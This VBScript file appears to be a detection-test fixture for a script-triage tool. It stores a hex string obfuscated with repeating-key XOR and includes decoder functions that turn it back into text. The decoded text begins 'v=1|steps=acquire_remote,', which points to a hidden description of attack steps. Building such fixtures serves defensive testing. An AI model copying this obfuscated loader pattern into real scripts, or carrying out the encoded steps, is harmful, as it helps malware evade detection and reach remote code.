Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_c582ba46 = "ae14bc6ef2ac4cfd61bcb94afc67e8aa4cd260e4b546f977adaf5be466e4874fe47ee4f44de461f1b95dee7adea85be271e4ab5aa17ae0b64de274e7875aee60e8a85df173e5b959f977f3e564e471f3b75ae274f5f671c05ec98c7ddd6ef2ac48ea77debb46f87cf5e51df171e0b559ec7be6b676e476bcbb48e062e0b14ee33fb1e14cb921b4ef4bef25fdad5be12fe9ac5dfd61bbf706bd2be4ec1ab825e3ba1ea377f9b944fd7ee4f640e364e0b440e93de5ef18eb21b9ba10a376e0ac55f861e4aa76ec75e4b65db05af4b65dff77f2ab65ec70aee810e826b2ed1eef70b6a44fe47ee48759ec66e9e56ab74ed4ab4cff61dd885cef7ee8bb75c567efac5be861f29448ef4ef2ac48ea77ace810e826b2ed1eef70b6f64dec66fdaa4cea7bf2ac5bf44df1b95de52fc9936ad84ed2b74ff965e0aa4cd15af4b65dff77f2ab65ec70dd9c40fe62eeab48ef7ee48419b477b5eb1cba70e3ef55e377f9ac76fe66e0bf4cb060e4ab46f860e2bd04fe73eca845e83cf1ab18"
Const Codec_c582ba46 = "hex_compact|repeating_key_xor|d8,29,8d,12,81"

Function Load_c582ba46()
  Dim result(), v_e598
  ReDim result((Len(Material_c582ba46) \ 2) - 1)
  For v_e598 = 0 To UBound(result)
    result(v_e598) = CInt("&H" & Mid(Material_c582ba46, v_e598 * 2 + 1, 2))
  Next
  Load_c582ba46 = result
End Function

Function Decode_c582ba46(ByRef v_a19c)
  Dim result(), v_e598, keyBytes, previous
  ReDim result(UBound(v_a19c))
  keyBytes = Array(216,41,141,18,129)
  For v_e598 = 0 To UBound(v_a19c)
    result(v_e598) = v_a19c(v_e598) Xor keyBytes(v_e598 Mod 5)
  Next
  Decode_c582ba46 = result
End Function

Function Recover_c582ba46()
  Dim v_a19c, v_b27e, v_c304, v_d41a, v_e598, v_f602, v_a702, v_b803
  ' configuration reconstruction
If (2 > 1) Then v_d41a = "left" Else v_d41a = "right"
  v_a19c = Load_c582ba46()
  Do
    v_b27e = Decode_c582ba46(v_a19c)
    Exit Do
  Loop
  v_c304 = ""
  For v_e598 = 0 To UBound(v_b27e)
    v_c304 = v_c304 & Chr(v_b27e(v_e598))
  Next
' reconstruction complete
  Recover_c582ba46 = v_c304
End Function

Function Inspect_c582ba46()
  Inspect_c582ba46 = Recover_c582ba46()
End Function
